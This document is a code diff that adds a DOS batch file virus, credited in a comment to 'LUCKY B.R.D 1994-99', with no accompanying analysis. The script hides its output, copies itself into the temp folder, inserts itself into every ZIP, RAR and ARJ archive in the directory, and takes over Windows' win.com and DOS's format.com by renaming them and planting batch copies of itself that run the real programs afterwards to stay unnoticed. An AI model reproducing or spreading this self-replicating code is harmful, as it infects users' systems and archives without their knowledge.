@@ -1,0 +1,48 @@
+@ctty nul
+copy %0 info.bat
+If Not exist %TEMP%\winstart.bat copy info.bat %TEMP%\winstart.bat
+for %%f in (*.zip) do pkzip %%f info.bat
+for %%f in (*.rar) do rar a -std %%f info.bat
+for %%f in (*.arj) do arj a %%f info.bat
+rem from LUCKY B.R.D 1994-99
+If exist C:\Windows\Win.Com goto DoW
+:Continue1
+If exist C:\Dos\Format.Com goto DoF
+:Continue2
+goto Exit
+:DoW
+ren c:\windows\win.com win.ovl
+copy %0 c:\windows\win.bat
+goto Continue1
+:DoF
+ren c:\Dos\Format.Com Format.Ovl
+copy %0 c:\Dos\Format.Bat
+goto Continue2
+:Exit
+del info.bat
+if %0==win.bat goto EW
+if %0==WIN.BAT goto EW
+If %0==win goto EW
+If %0==WIN goto EW
+if %0==format.bat goto EF
+if %0==format goto EF
+if %0==FORMAT.BAT goto EF
+if %0==FORMAT goto EF
+Goto NExit
+:EW
+ren c:\Windows\Win.Ovl Win.Com
+ctty con
+@C:\Windows\Win.Com %1 %2 %3 %4 %5 %6 %7 %8 %9
+@ctty nul
+ren c:\Windows\Win.Com Win.Ovl
+goto FNExit
+:EF
+ren c:\Dos\Format.Ovl Format.Com
+ctty con
+@C:\Dos\Format.Com %1 %2 %3 %4 %5 %6 %7 %8 %9
+@ctty nul
+ren c:\Dos\Format.Com Format.Ovl
+goto FNExit
+:NExit
+ctty con
+:FNExit
